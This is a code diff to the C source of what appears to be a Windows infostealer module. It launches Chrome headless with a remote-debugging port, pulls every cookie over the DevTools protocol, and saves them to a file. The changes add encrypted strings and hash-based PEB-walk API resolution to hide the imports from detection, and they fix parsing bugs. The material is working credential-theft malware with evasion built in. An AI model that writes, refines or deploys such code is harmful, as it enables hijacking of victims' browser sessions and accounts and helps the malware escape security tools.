@@ -17,9 +17,13 @@
 #include "ws2.h"
 #include "mirage_asm.h"
 #include "nt_types.h"
+#include "enc_strings.h"
 
 #ifdef ENABLE_CDP_GRABBER
 #ifdef _WIN32
+
+#define CDP_PORT_START 9222
+#define CDP_PORT_END   9230
 
 #include <windows.h>
 #include <winsock2.h>
@@ -47,11 +51,11 @@ static int json_extract_str(const char *json, const char *key,
             case '\\': out[i++] = '\\'; break;
             case 'n':  out[i++] = '\n'; break;
             case 't':  out[i++] = '\t'; break;
-            default:   out[i++] = p[i + 1]; break;
+            default:   out[i] = p[i + 1]; i++; break;
             }
             p += 2;
         } else {
-            out[i++] = p[i++];
+            out[i] = p[i]; i++;
         }
     }
     out[i] = '\0';
@@ -99,6 +103,28 @@ typedef HANDLE  (WINAPI *pFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
 typedef BOOL    (WINAPI *pFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
 typedef BOOL    (WINAPI *pFindClose)(HANDLE);
 
+/* ── PEB-walk wsprintfW from user32.dll ──────────────────────── */
+
+typedef int (WINAPI *pwsprintfW)(LPWSTR, LPCWSTR, ...);
+
+static struct {
+    pwsprintfW  pWSF;
+    int         ready;
+} g_cdp_user32;
+
+static int cdp_user32_ensure(void) {
+    if (g_cdp_user32.ready) return 1;
+    char dll[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
+    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!u32) return 0;
+    char fn[32];
+    enc_decrypt(enc_wsprintfW, ENC_WSPRINTFW_LEN, fn);
+    g_cdp_user32.pWSF = (pwsprintfW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    if (!g_cdp_user32.pWSF) return 0;
+    g_cdp_user32.ready = 1;
+    return 1;
+}
+
 /* ── Resolve helper ───────────────────────────────────────────── */
 
 static void* resolve_fn(void* mod, const char* name) {
@@ -112,8 +138,7 @@ static int http_get(const char *host, int port, const char *path,
     ws2_socket_t ws;
     ws2_result_t r = ws2_connect(&ws, host, (uint16_t)port);
     if (r != WS2_OK) return -1;
-    HANDLE sock;
-    memcpy(&sock, &ws, sizeof(HANDLE));
+    HANDLE sock = ws.handle;
 
     char req[512];
     int rlen = snprintf(req, sizeof(req),
@@ -252,6 +277,7 @@ static int write_netscape_cookies(const char *json_resp, const char *output_path
 
         int secure = json_extract_bool(block, "secure");
         int httpOnly = json_extract_bool(block, "httpOnly");
+        (void)httpOnly;
         double expires = json_extract_number(block, "expires");
 
         if (domain[0] && name[0]) {
@@ -367,10 +393,11 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     int port = 0;
     char ws_url[512] = {0};
 
-    for (int p = 9222; p <= 9230 && port == 0; p++) {
+    for (int p = CDP_PORT_START; p <= CDP_PORT_END && port == 0; p++) {
         /* Build command line */
         wchar_t cmd[1024];
-        wsprintfW(cmd, L"\"%hs\" --remote-debugging-port=%d --headless --disable-gpu "
+        if (!cdp_user32_ensure()) return -1;
+        g_cdp_user32.pWSF(cmd, L"\"%hs\" --remote-debugging-port=%d --headless --disable-gpu "
                         L"--no-first-run --disable-software-rasterizer "
                         L"--user-data-dir=\"%ls\"",
                   chrome_path, p, temp_dir);
@@ -443,8 +470,7 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     ws2_socket_t ws_conn;
     if (ws2_connect(&ws_conn, host, (uint16_t)ws_port) != WS2_OK)
         return -1;
-    HANDLE ws_sock;
-    memcpy(&ws_sock, &ws_conn, sizeof(HANDLE));
+    HANDLE ws_sock = ws_conn.handle;
 
     /* Send WebSocket upgrade request */
     char upgrade[1024];
